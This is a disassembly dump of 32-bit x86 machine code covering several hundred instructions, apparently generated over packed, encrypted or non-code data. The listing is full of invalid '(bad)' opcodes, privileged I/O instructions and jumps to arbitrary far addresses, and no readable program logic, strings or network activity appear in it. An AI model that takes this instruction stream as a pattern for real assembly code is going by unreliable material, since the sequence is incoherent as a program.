  416549:	mov    DWORD PTR [ebx],eax
  41654b:	adc    cl,0x3b
  41654e:	loope  0x4165c3
  416550:	pop    esi
  416551:	sbb    DWORD PTR [ebp+0x1cf8af04],esi
  416557:	lock ret 0x2cbf
  41655b:	pand   mm3,mm0
  41655e:	sbb    al,0xdd
  416560:	adc    edi,esp
  416562:	(bad)  
  416563:	pop    esp
  416564:	inc    eax
  416565:	sbb    edx,esp
  416567:	into   
  416568:	ret    0x87b6
  41656b:	jmp    0x9a2eb69b
  416570:	aas    
  416571:	adc    cl,BYTE PTR [ecx+0x2c75f45d]
  416577:	sahf   
  416578:	(bad)  
  41657a:	enter  0x5974,0x1d
  41657e:	dec    eax
  41657f:	mov    ecx,0x5c2aefc
  416584:	push   esp
  416585:	add    eax,0xe984f7dd
  41658a:	add    DWORD PTR [bx+0x1c],edx
  41658e:	dec    edi
  41658f:	scas   al,BYTE PTR es:[edi]
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x7eb04354]
  416601:	push   edi
  416602:	ror    BYTE PTR [esp+eax*2+0x40000ec],cl
  416609:	add    DWORD PTR [eax],eax
  41660b:	add    BYTE PTR [esi+0x451ce6b9],bh
  416611:	div    DWORD PTR [ebp-0x34]
  416614:	loope  0x4165fc
  416616:	xor    BYTE PTR [edi+0xe5018b8],ch
  41661c:	loopne 0x416644
  41661e:	fwait
  41661f:	cmp    eax,0x4232b975
  416624:	adc    BYTE PTR [edx-0x22],cl
  416627:	mov    ds:0x521d0b45,eax
  41662c:	rcr    BYTE PTR ds:0xc33b298a,0xab
  416633:	aad    0x47
  416635:	popf   
  416636:	scas   al,BYTE PTR es:[edi]
  416637:	mov    edx,0x629602cd
  41663c:	jb     0x41668e
  41663e:	mov    ds:0x86c68118,al
  416643:	faddp  st(4),st
  416645:	je     0x4166c4
  416647:	adc    ebx,DWORD PTR [ebx+0x4a]
  41664a:	mov    ebp,0xdbdf49cc
  41664f:	retf   0x3ea3
  416652:	fs dec ebp
  416654:	dec    ebx
  416655:	sbb    eax,0x18ba3a07
  41665a:	xlat   BYTE PTR ds:[ebx]
  41665b:	dec    eax
  41665c:	dec    ecx
  41665d:	out    dx,eax
  41665e:	sti    
  41665f:	sub    al,0x1e
  416661:	(bad)  
  416662:	enter  0xce7c,0x9
  416666:	(bad)  
  416667:	jbe    0x4166d2
  416669:	mov    bh,0xde
  41666b:	or     edi,DWORD PTR [ecx]
  41666d:	enter  0x877c,0x16
  416671:	push   ebx
  416672:	add    BYTE PTR [ecx+0x74],bl
  416675:	push   es
  416676:	bound  esp,QWORD PTR [esi-0x5671e7ad]
  41667c:	ret    0x42c1
  41667f:	out    dx,al
  416680:	fcomp  QWORD PTR [esi+0x6]
  416683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416684:	(bad)  
  416685:	lock pop esp
  416687:	adc    edx,esi
  416689:	and    BYTE PTR [edi],ch
  41668b:	in     al,0xd7
  41668d:	pop    esi
  41668e:	dec    esp
  41668f:	sti    
  416690:	inc    ebx
  416691:	mov    al,0xc
  416693:	sti    
  416694:	icebp  
  416695:	or     al,0x8
  416697:	test   eax,0xef6509f3
  41669c:	call   0x4504740
  4166a1:	mov    al,0x4c
  4166a3:	push   edx
  4166a4:	sub    eax,DWORD PTR [eax-0x3b6363a4]
  4166aa:	lods   al,BYTE PTR ds:[esi]
  4166ab:	sub    eax,0x521c87f2
  4166b0:	adc    eax,0x8dd1f1a
  4166b5:	xor    esi,edx
  4166b7:	jne    0x416682
  4166b9:	add    ecx,DWORD PTR [edi]
  4166bb:	jle    0x4166f5
  4166bd:	mov    ah,0x36
  4166bf:	cmp    esp,ebp
  4166c1:	out    0xfd,al
  4166c3:	(bad)  
  4166c4:	cld    
  4166c5:	xchg   ebp,eax
  4166c6:	or     ah,BYTE PTR [edi-0x61753ab0]
  4166cc:	sub    DWORD PTR [ecx-0x42],ecx
  4166cf:	sub    BYTE PTR [esi],al
  4166d1:	fbld   TBYTE PTR [edi]
  4166d3:	push   0x6a
  4166d5:	and    cl,cl
  4166d7:	std    
  4166d8:	imul   BYTE PTR [ecx-0x30610b33]
  4166de:	push   edx
  4166df:	mov    ebx,0x8a2b6ef1
  4166e4:	out    0x40,eax
  4166e6:	cmp    esi,edx
  4166e8:	loopne 0x41674e
  4166ea:	jns    0x4166b6
  4166ec:	rcl    DWORD PTR [edi+0x8b22995],1
  4166f2:	mov    edi,0x68af0568
  4166f7:	dec    edx
  4166f8:	sti    
  4166f9:	xchg   esp,eax
  4166fa:	nop
  4166fb:	call   0x6a7f:0xd08bf227
  416702:	outs   dx,BYTE PTR ds:[esi]
  416703:	call   0x9bcd56ff
  416708:	cmp    al,0x2a
  41670a:	or     al,0xd0
  41670c:	jl     0x4166a8
  41670e:	retf   0x24
	...
  416771:	add    BYTE PTR [eax],al
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	xchg   edx,eax
  416781:	ins    BYTE PTR es:[edi],dx
  416782:	inc    esi
  416783:	jno    0x4167cd
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	add    eax,DWORD PTR [ecx]
  41678e:	loopne 0x41678b
  416790:	fsub   QWORD PTR [esi-0xc]
  416793:	std    
  416794:	imul   al
  416796:	dec    ebp
  416797:	pusha  
  416798:	xchg   ebp,eax
  416799:	nop
  41679a:	push   ebp
  41679b:	push   cs
  41679c:	sub    al,0xdc
  41679e:	outs   dx,BYTE PTR ds:[esi]
  41679f:	cmp    DWORD PTR [edx-0x5e7b6f9a],esi
  4167a5:	adc    ebx,DWORD PTR [ecx+0x12]
  4167a8:	xchg   edx,eax
  4167a9:	push   es
  4167aa:	fadd   st(6),st
  4167ac:	cs xchg edx,edx
  4167af:	ret    
  4167b0:	mov    edx,0xb4a9c1c3
  4167b5:	or     bl,BYTE PTR [ebp-0x73106f92]
  4167bb:	xor    DWORD PTR [ebp+0x7c40439e],eax
  4167c1:	stc    
  4167c2:	out    0x22,eax
  4167c4:	(bad)  
  4167c5:	lock mov ebp,0x934833c5
  4167cb:	cmp    BYTE PTR [esi+ebx*4+0x2608284c],al
  4167d2:	icebp  
  4167d3:	cmp    BYTE PTR [ebp-0x73],0x5
  4167d7:	or     eax,0xbb9d7149
  4167dc:	dec    edi
  4167dd:	push   ss
  4167de:	adc    DWORD PTR [ebx],edi
  4167e0:	or     BYTE PTR [ebp-0x7f4b5534],ah
  4167e6:	inc    ecx
  4167e7:	xor    dh,BYTE PTR [esi]
  4167e9:	inc    edi
  4167ea:	cmp    BYTE PTR [ebx-0x6fa9baf],0x74
  4167f1:	and    esp,esi
  4167f3:	inc    edx
  4167f4:	leave  
  4167f5:	pop    edx
  4167f6:	add    ecx,DWORD PTR [ebx+0x51]
  4167f9:	aam    0xf3
  4167fb:	xor    edx,DWORD PTR [eax+0xead05b4]
  416801:	cmp    BYTE PTR [edx-0x69],al
  416804:	push   es
  416805:	out    0xc4,eax
  416807:	std    
  416808:	sbb    ebx,DWORD PTR [esi+ebx*2+0x6eae2374]
  41680f:	inc    eax
  416810:	sub    DWORD PTR [edx+0x6],esp
  416813:	retf   
  416814:	stos   BYTE PTR es:[edi],al
  416815:	mov    eax,ds:0xe94ddd41
  41681a:	ret    
  41681b:	ins    DWORD PTR es:[edi],dx
  41681c:	sbb    eax,DWORD PTR [ecx-0x5baa26c1]
  416822:	cmp    al,BYTE PTR [edx+0x28ea9fc5]
  416828:	not    BYTE PTR [ebx+0x70632e0e]
  41682e:	sbb    BYTE PTR [edi],ch
  416830:	mov    cl,0x7a
  416832:	stos   DWORD PTR es:[edi],eax
  416833:	call   0x4ab2:0xb4ff83a9
  41683a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41683b:	pop    ss
  41683c:	mov    esp,0x5401e904
  416841:	inc    edi
  416842:	push   edi
  416843:	cs jmp 0x4168a8
  416846:	(bad)  
  416847:	ins    DWORD PTR es:[edi],dx
  416848:	mov    edi,0x1c0bd06f
  41684d:	cmp    dh,0xe
  416850:	aam    0x47
  416852:	adc    DWORD PTR [esi-0x4eecaec5],edx
  416858:	xchg   edx,eax
  416859:	aas    
  41685a:	mov    dl,0x3f
  41685c:	mov    eax,0x9503e6d7
  416861:	outs   dx,DWORD PTR ds:[esi]
  416862:	icebp  
  416863:	std    
  416864:	fidiv  DWORD PTR [esp+eiz*2+0x29fa10e8]
  41686b:	xchg   esi,eax
  41686c:	scas   al,BYTE PTR es:[edi]
  41686d:	sbb    BYTE PTR [ebx-0x62],bh
  416870:	gs mov dh,ch
  416873:	sub    eax,0x47a4e9e2
  416878:	imul   edi,DWORD PTR [edx-0x68],0x9a6eaad9
  41687f:	adc    edx,edi
  416881:	inc    esp
  416882:	adc    eax,0x88935d55
  416887:	imul   esi,DWORD PTR [ecx+0x20bccdd],0xffffffb4
  41688e:	fdiv   DWORD PTR [edx+0x0]
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x475de98a
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	idiv   DWORD PTR [edx-0x44]
  41690f:	sub    eax,0x378bc7b
  416914:	dec    edi
  416915:	test   esp,0x60c232ad
  41691b:	ins    BYTE PTR es:[edi],dx
  41691c:	cmp    BYTE PTR [ebx-0x3a],cl
  41691f:	xchg   esp,eax
  416920:	and    DWORD PTR [edi-0x65755935],ecx
  416926:	out    0x35,eax
  416928:	add    al,0xb6
  41692a:	mov    esp,esi
  41692c:	cld    
  41692d:	sbb    BYTE PTR [edi],ah
  41692f:	sbb    esi,edx
  416931:	adc    bh,ch
  416933:	lods   eax,DWORD PTR ds:[esi]
  416934:	test   eax,0xded5519d
  416939:	jbe    0x416951
  41693b:	dec    esp
  41693c:	sub    bh,BYTE PTR [eax-0x1d069e8]
  416942:	rol    BYTE PTR ds:0xbd691a1c,0x92
  416949:	mov    ebp,0x893aa097
  41694e:	sub    BYTE PTR [eax-0x2a14bfd4],ah
  416954:	mov    bl,0xe0
  416956:	(bad)  
  416957:	out    dx,eax
  416958:	xlat   BYTE PTR ds:[ebx]
  416959:	jle    0x41694b
  41695b:	pop    edx
  41695c:	bnd call 0x3700f4e6
  416962:	add    DWORD PTR [eax-0x7e],edx
  416965:	jge    0x4168e7
  416967:	loope  0x416977
  416969:	hlt    
  41696a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41696b:	jo     0x4169c9
  41696d:	ss out 0xd4,al
  416970:	test   al,0xd
  416972:	test   DWORD PTR fs:[eax],ebp
  416975:	mov    dh,0x7e
  416977:	jmp    0x4c99267
  41697c:	fist   DWORD PTR [ecx-0x72b51057]
  416982:	cld    
  416983:	dec    ecx
  416984:	ins    DWORD PTR es:[edi],dx
  416985:	sub    DWORD PTR ds:0x9baa475f,0x2f
  41698c:	cld    
  41698d:	scas   eax,DWORD PTR es:[edi]
  41698e:	sub    esi,DWORD PTR [edi-0xb8c4872]
  416994:	jb     0x41694f
  416996:	div    ch
  416998:	inc    esp
  416999:	push   ebp
  41699a:	mov    esi,0xb8441c31
  41699f:	inc    ebp
  4169a0:	jle    0x416924
  4169a2:	add    DWORD PTR [ecx-0x84c2b44],edi
  4169a8:	bound  edx,QWORD PTR [edx]
  4169aa:	daa    
  4169ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ac:	or     ebx,DWORD PTR [ebx+edx*2-0x74bc0de0]
  4169b3:	test   BYTE PTR [ebp+0x70],0xea
  4169b7:	mov    bl,0xc7
  4169b9:	(bad)  
  4169bb:	scas   eax,DWORD PTR es:[edi]
  4169bc:	and    esi,eax
  4169be:	les    eax,FWORD PTR [ebx]
  4169c0:	(bad)  
  4169c1:	and    eax,edx
  4169c3:	adc    BYTE PTR [edi+0x2110b361],dl
  4169c9:	mov    ds:0x7b453a1b,eax
  4169ce:	(bad)  
  4169cf:	xchg   edi,eax
  4169d0:	sti    
  4169d1:	mov    eax,ds:0x14749db9
  4169d6:	daa    
  4169d7:	test   DWORD PTR [edx-0x5d],esi
  4169da:	jbe    0x416a04
  4169dc:	push   0x7ae146b2
  4169e1:	dec    esi
  4169e2:	cmp    bl,BYTE PTR [edx]
  4169e4:	push   esp
  4169e5:	shr    BYTE PTR [ecx+0x61ffcc66],cl
  4169eb:	push   edi
  4169ec:	pop    ebp
  4169ed:	xchg   ebp,eax
  4169ee:	in     al,dx
  4169ef:	cld    
  4169f0:	(bad)  
  4169f1:	ins    DWORD PTR es:[edi],dx
  4169f2:	cld    
  4169f3:	(bad)  
  4169f4:	adc    ecx,DWORD PTR [eax-0x3810cd7a]
  4169fa:	lea    edi,[ebp-0x244283b4]
  416a00:	add    eax,0xaba9a32
  416a05:	aad    0xac
  416a07:	lahf   
  416a08:	bound  ebx,QWORD PTR [edx-0x70]
  416a0b:	scas   al,BYTE PTR es:[edi]
  416a0c:	sub    eax,0x94b924
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x87b90ba3
  416a82:	int    0x44
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	outs   dx,DWORD PTR ds:[esi]
  416a8d:	xchg   ecx,eax
  416a8e:	imul   esp,DWORD PTR [eax+0x69],0xffffffce
  416a92:	push   eax
  416a93:	xchg   DWORD PTR [ebp-0x3c96ee29],esi
  416a99:	sbb    esi,ebp
  416a9b:	retf   0xa4f6
  416a9e:	jo     0x416b08
  416aa0:	ds jb  0x416a34
  416aa3:	push   cs
  416aa4:	sbb    BYTE PTR [esi-0x51013b32],0x70
  416aab:	sbb    ebx,DWORD PTR [edx]
  416aad:	retf   
  416aae:	stos   BYTE PTR es:[edi],al
  416aaf:	lods   al,BYTE PTR ds:[esi]
  416ab0:	es jnp 0x416abf
  416ab3:	mov    al,0x78
  416ab5:	out    0xe8,al
  416ab7:	cwde   
  416ab8:	or     dh,ah
  416aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416abb:	sub    cl,BYTE PTR [ebp+ebp*2+0x50285879]
  416ac2:	(bad)  
  416ac3:	out    0xbb,al
  416ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ac6:	rcr    BYTE PTR [ebx+0x2f],0x56
  416aca:	retf   0x1111
  416acd:	pusha  
  416ace:	xchg   edi,eax
  416acf:	(bad)  
  416ad0:	cmp    al,0x7e
  416ad2:	mov    dh,0xca
  416ad4:	bound  ecx,QWORD PTR [ebx-0x3eed1cb4]
  416ada:	jge    0x416ad9
  416adc:	push   ebx
  416add:	cld    
  416ade:	add    BYTE PTR [eax],bh
  416ae0:	cmp    BYTE PTR [esi-0x3ef2178a],ah
  416ae6:	push   ds
  416ae7:	jg     0x416a77
  416ae9:	outs   dx,BYTE PTR ds:[esi]
  416aea:	or     al,0x71
  416aec:	je     0x416ab3
  416aee:	mov    DWORD PTR [edx-0x60],edi
  416af1:	push   ecx
  416af2:	sbb    DWORD PTR [edi-0x72],0x57
  416af6:	sub    BYTE PTR [edi+esi*1+0x64],ch
  416afa:	sbb    eax,0x3737b7fd
  416aff:	jmp    0x416ac1
  416b01:	dec    ebx
  416b02:	stos   BYTE PTR es:[edi],al
  416b03:	je     0x416af1
  416b05:	mov    ch,0x2c
  416b07:	(bad)  
  416b09:	shl    edx,1
  416b0b:	push   esp
  416b0c:	jns    0x416ae0
  416b0e:	out    dx,al
  416b0f:	push   cs
  416b10:	dec    edi
  416b11:	ds ins BYTE PTR es:[edi],dx
  416b13:	pop    eax
  416b14:	outs   dx,DWORD PTR ds:[esi]
  416b15:	jae    0x416b44
  416b17:	mov    eax,0x730e17de
  416b1c:	mov    eax,0xf3c63128
  416b21:	daa    
  416b22:	mov    bh,0x95
  416b24:	xchg   ecx,eax
  416b25:	cmp    al,0x13
  416b27:	arpl   WORD PTR [ebx+0x1d1847ce],sp
  416b2d:	out    dx,al
  416b2e:	xchg   ecx,eax
  416b2f:	adc    esi,esi
  416b31:	pop    edx
  416b32:	cs (bad) 
  416b34:	add    DWORD PTR [ebp+0x6b],ecx
  416b37:	fcom   QWORD PTR [esi]
  416b39:	pop    eax
  416b3a:	sbb    eax,0x7e9edabd
  416b3f:	lods   eax,DWORD PTR ds:[esi]
  416b40:	add    BYTE PTR [eax-0x69ac0002],dl
  416b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b47:	(bad)  
  416b48:	mov    ebx,0x3233384a
  416b4d:	cmp    al,0xc4
  416b4f:	jle    0x416af0
  416b51:	push   esp
  416b52:	jl     0x416af0
  416b54:	sub    al,0xc2
  416b56:	aad    0x1e
  416b58:	push   esi
  416b59:	adc    dh,BYTE PTR [edx+0x2be6bdae]
  416b5f:	mov    edi,0x8f2225fe
  416b64:	sub    DWORD PTR [esi+0x1e1cde1e],ebx
  416b6a:	shl    BYTE PTR [ecx+0x1e],0x7a
  416b6e:	clc    
  416b6f:	mov    WORD PTR [esi+edx*2],es
  416b72:	or     al,0x18
  416b74:	adc    BYTE PTR [edx+0x75f823b9],bl
  416b7a:	inc    ebp
  416b7b:	imul   esi,DWORD PTR [esi-0x6a6e9edc],0x49
  416b82:	outs   dx,DWORD PTR ds:[esi]
  416b83:	pop    edi
  416b84:	int    0xdf
  416b86:	adc    BYTE PTR [edx],dl
  416b88:	ja     0x416b1b
  416b8a:	mov    edi,0x2bf4800f
  416b8f:	sbb    al,BYTE PTR [eax]
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xca5b70a9
  416c01:	mov    al,0xe5
  416c03:	in     eax,0x54
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	es push ebx
  416c0e:	mov    ds:0x2fd6f690,al
  416c13:	mov    edx,0x80f70218
  416c18:	test   BYTE PTR [edi+0x6dd75f88],al
  416c1e:	mov    dh,0x22
  416c20:	imul   BYTE PTR [ecx]
  416c22:	out    dx,al
  416c23:	add    edx,ebx
  416c25:	sub    ecx,ebx
  416c27:	dec    ebx
  416c28:	or     BYTE PTR [ebp+0x6dc78124],ch
  416c2e:	in     al,0xe5
  416c30:	adc    ch,bh
  416c32:	inc    ecx
  416c33:	and    eax,DWORD PTR [ebp+0x6d]
  416c36:	jno    0x416c70
  416c38:	popa   
  416c39:	pop    esi
  416c3a:	ins    BYTE PTR es:[edi],dx
  416c3b:	into   
  416c3c:	jge    0x416bc3
  416c3e:	add    esi,esi
  416c40:	loope  0x416ca3
  416c42:	ja     0x416bed
  416c44:	jmp    0x9450:0x6beda167
  416c4b:	and    esi,DWORD PTR [ebp+esi*2+0x2]
  416c4f:	mov    ss:0x47d1635e,al
  416c55:	retf   0x14e7
  416c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c59:	mov    ds:0x8c38fae2,eax
  416c5e:	es (bad) 
  416c61:	push   eax
  416c62:	dec    eax
  416c63:	aaa    
  416c64:	or     edi,DWORD PTR [esp+ebx*4]
  416c67:	sub    edi,DWORD PTR ds:0x86ad8117
  416c6d:	wbinvd 
  416c6f:	inc    eax
  416c70:	dec    edx
  416c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c72:	push   ss
  416c73:	imul   ebx,edi,0x6d
  416c76:	lods   eax,DWORD PTR ds:[esi]
  416c77:	out    0x80,al
  416c79:	pop    esi
  416c7a:	pop    esp
  416c7b:	sub    bh,dl
  416c7d:	sbb    eax,DWORD PTR [esi]
  416c7f:	cmp    BYTE PTR [edi],bh
  416c81:	mov    ebp,0x643708bf
  416c86:	dec    esi
  416c87:	mov    esi,0xc187c18e
  416c8c:	mov    ds,esi
  416c8e:	mov    esi,DWORD PTR [eax+0x65]
  416c91:	mov    esp,0x19a53358
  416c96:	jmp    0x28dc:0xd8d96433
  416c9d:	mov    eax,0x961f2466
  416ca2:	adc    DWORD PTR [edx-0xb],esi
  416ca5:	fwait
  416ca6:	bnd jg 0x416c72
  416ca9:	fisub  DWORD PTR [edx+0x6e]
  416cac:	and    eax,0xffffffb2
  416caf:	xchg   ebp,eax
  416cb0:	sbb    ebp,DWORD PTR [ebp+0x7c5c6d0c]
  416cb6:	int3   
  416cb7:	mov    ah,0x91
  416cb9:	stc    
  416cba:	imul   eax,DWORD PTR [esi+0x6f2df998],0x40b81296
  416cc4:	mov    bl,0x4
  416cc6:	push   0xffffff8a
  416cc8:	add    DWORD PTR [edx+0x3a51a795],eax
  416cce:	jecxz  0x416d01
  416cd0:	(bad)  
  416cd1:	push   esi
  416cd2:	cli    
  416cd3:	or     dh,BYTE PTR [eax]
  416cd5:	xor    edx,DWORD PTR [edi+ebp*2+0x7350eb02]
  416cdc:	les    ecx,FWORD PTR [edi+0x60]
  416cdf:	pop    esi
  416ce0:	xor    ecx,DWORD PTR [esp+ecx*8-0x7f]
  416ce4:	xor    DWORD PTR ss:[edi],esp
  416ce7:	or     DWORD PTR [ebx-0x43],esi
  416cea:	(bad)  
  416ceb:	fldenv [ebp-0x63fecb7f]
  416cf1:	dec    edi
  416cf2:	mov    edi,0xb1ad4b2b
  416cf7:	out    dx,al
  416cf8:	mov    ebp,0x40e94791
  416cfd:	outs   dx,BYTE PTR ds:[esi]
  416cfe:	pop    ss
  416cff:	hlt    
  416d00:	and    BYTE PTR [edx],bl
  416d02:	retf   
  416d03:	das    
  416d04:	sti    
  416d05:	inc    ebp
  416d06:	add    BYTE PTR [ecx],cl
  416d08:	inc    ebp
  416d09:	pop    ebp
  416d0a:	cli    
  416d0b:	mov    ebp,DWORD PTR [ebx+0x4391be]
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	sar    ebp,0xdf
  416d83:	in     al,dx
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	adc    BYTE PTR [ecx+0x19],0x8e
  416d90:	adc    eax,0x8e397bc4
  416d95:	icebp  
  416d96:	push   ds
  416d97:	cwde   
  416d98:	out    0x33,al
  416d9a:	xchg   ecx,eax
  416d9b:	push   ecx
  416d9c:	or     al,0x25
  416d9e:	jl     0x416d4b
  416da0:	stc    
  416da1:	jp     0x416de0
  416da3:	push   edx
  416da4:	or     dl,BYTE PTR [edx-0x71]
  416da7:	mov    esp,0x47500e90
  416dac:	push   0xfffffff6
  416dae:	loopne 0x416d61
  416db0:	sub    al,0x47
  416db2:	dec    edx
  416db3:	jmp    0xab16:0x4d6c31d8
  416dba:	pop    eax
  416dbb:	xor    edi,DWORD PTR [edx+0x159daffd]
  416dc1:	cli    
  416dc2:	pop    edi
  416dc3:	loop   0x416d7b
  416dc5:	ret    0xef42
  416dc8:	dec    ebx
  416dc9:	fs jno 0x416e1c
  416dcc:	and    BYTE PTR [ecx+0x73],0x59
  416dd0:	add    cl,bl
  416dd2:	scas   al,BYTE PTR es:[edi]
  416dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dd4:	cmc    
  416dd5:	jno    0x416e03
  416dd7:	inc    ecx
  416dd8:	adc    al,al
  416dda:	cmc    
  416ddb:	stos   DWORD PTR es:[edi],eax
  416ddc:	lods   al,BYTE PTR cs:[esi]
  416dde:	jo     0x416e1a
  416de0:	in     al,0x1b
  416de2:	aad    0xf4
  416de4:	leave  
  416de5:	add    al,bl
  416de7:	icebp  
  416de8:	gs pusha 
  416dea:	xor    DWORD PTR [edx+ebx*1],esi
  416ded:	sub    ebx,DWORD PTR [esi+0x2]
  416df0:	or     esp,DWORD PTR [edi-0x2ba61b6d]
  416df6:	push   0x6af041b0
  416dfb:	ret    0x7903
  416dfe:	mov    ds:0xc6ec4c6b,al
  416e03:	mov    esp,0x33e86e11
  416e08:	mov    ecx,0x9cb48f59
  416e0d:	(bad)  
  416e0e:	push   eax
  416e0f:	cmp    ecx,edx
  416e11:	jo     0x416e86
  416e13:	pop    ds
  416e14:	fsub   DWORD PTR [edi]
  416e16:	stos   DWORD PTR es:[edi],eax
  416e17:	sbb    eax,0xf05a8c90
  416e1c:	std    
  416e1d:	xchg   esp,eax
  416e1e:	loop   0x416e24
  416e20:	call   0x3d850cad
  416e25:	inc    edx
  416e26:	jne    0x416db9
  416e28:	mov    esp,0xa8d8bbed
  416e2d:	stos   DWORD PTR es:[edi],eax
  416e2e:	pop    esp
  416e2f:	dec    eax
  416e30:	sbb    ah,BYTE PTR [edi]
  416e32:	mov    eax,?
  416e34:	jne    0x416ea8
  416e36:	les    esi,FWORD PTR [ecx]
  416e38:	jnp    0x416e6b
  416e3a:	pushf  
  416e3b:	ds pop ebp
  416e3d:	popa   
  416e3e:	leave  
  416e3f:	(bad)  
  416e40:	loop   0x416e8c
  416e42:	lea    ebp,es:[ebp+0x4228145f]
  416e49:	arpl   WORD PTR [edi+0x6e710c28],dx
  416e4f:	sbb    BYTE PTR [edx+ebx*2+0x23],bl
  416e53:	icebp  
  416e54:	pop    ebp
  416e55:	rcl    DWORD PTR [ebx-0x74],1
  416e58:	fs out dx,eax
  416e5a:	sub    DWORD PTR [eax+0x3b],ebx
  416e5d:	ins    BYTE PTR es:[edi],dx
  416e5e:	mov    ch,0x8e
  416e60:	sub    BYTE PTR [edx+0x3938bdc7],bh
  416e66:	inc    esp
  416e67:	adc    al,0x61
  416e69:	push   esp
  416e6a:	mov    al,ds:0x22b21ccc
  416e6f:	pusha  
  416e70:	mov    ecx,0x7ca6e8c1
  416e75:	loope  0x416ed5
  416e77:	xchg   ebp,eax
  416e78:	ret    
  416e79:	popf   
  416e7a:	sub    al,0x2e
  416e7c:	sbb    BYTE PTR [esi+ecx*2-0x11],cl
  416e80:	je     0x416e2e
  416e82:	pop    ds
  416e83:	rcl    bh,1
  416e85:	jle    0x416ecd
  416e87:	adc    BYTE PTR [esi-0xf],0xd9
  416e8b:	cmp    DWORD PTR [ebp-0x68],ecx
  416e8e:	or     cl,BYTE PTR ds:0x0
	...
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x2998eea
  416f02:	adc    BYTE PTR [edx+0xf25c],dl
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	mov    ?,ebp
  416f0e:	inc    esi
  416f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f10:	xchg   esi,eax
  416f11:	repnz mov al,ds:0xca944adf
  416f17:	retf   
  416f18:	xchg   ebp,eax
  416f19:	retf   
  416f1a:	stos   BYTE PTR es:[edi],al
  416f1b:	add    eax,0xd0d01c36
  416f20:	push   edx
  416f21:	xor    eax,0xc028be06
  416f26:	sar    DWORD PTR ds:0xb72152f,0xe1
  416f2d:	jnp    0x416ee2
  416f2f:	das    
  416f30:	cmp    bh,BYTE PTR [ebx+0x11]
  416f33:	enter  0xed7e,0x13
  416f37:	in     eax,dx
  416f38:	ss ss scas al,BYTE PTR es:[edi]
  416f3b:	pop    eax
  416f3c:	inc    ecx
  416f3d:	out    0x75,eax
  416f3f:	mov    bl,0x6a
  416f41:	push   ds
  416f42:	lea    ecx,[esi+0x4c]
  416f45:	and    BYTE PTR [eax+0x2c],bh
  416f48:	outs   dx,BYTE PTR ds:[esi]
  416f49:	sahf   
  416f4a:	hlt    
  416f4b:	inc    ebp
  416f4c:	push   ebp
  416f4d:	ret    0x6989
  416f50:	jae    0x416fa3
  416f52:	(bad)  
  416f53:	mov    ds:0xd6c4ee10,al
  416f58:	pop    ebp
  416f59:	sahf   
  416f5a:	mov    db5,esp
  416f5d:	scas   al,BYTE PTR es:[edi]
  416f5e:	pop    edx
  416f5f:	ds mov ebx,0x93369e7f
  416f65:	scas   eax,DWORD PTR es:[edi]
  416f66:	sbb    ch,cl
  416f68:	(bad)  
  416f69:	stc    
  416f6a:	pusha  
  416f6b:	xchg   edi,eax
  416f6c:	inc    ecx
  416f6d:	scas   al,BYTE PTR es:[edi]
  416f6e:	mov    BYTE PTR [ebx+0x78fa1551],bl
  416f74:	imul   ecx,DWORD PTR [eax-0x5bb983c1],0x6f13be84
  416f7e:	outs   dx,BYTE PTR ds:[esi]
  416f7f:	aas    
  416f80:	mov    gs,WORD PTR [esi]
  416f82:	mov    gs,WORD PTR [edx-0x76]
  416f85:	cmp    ecx,esp
  416f87:	loop   0x416f80
  416f89:	repnz dec ebp
  416f8b:	outs   dx,BYTE PTR ds:[esi]
  416f8c:	out    0x85,al
  416f8e:	stos   BYTE PTR es:[edi],al
  416f8f:	in     eax,0xdf
  416f91:	in     al,0x77
  416f93:	lahf   
  416f94:	pop    eax
  416f95:	jbe    0x416ffa
  416f97:	mov    ds:0xade63d24,eax
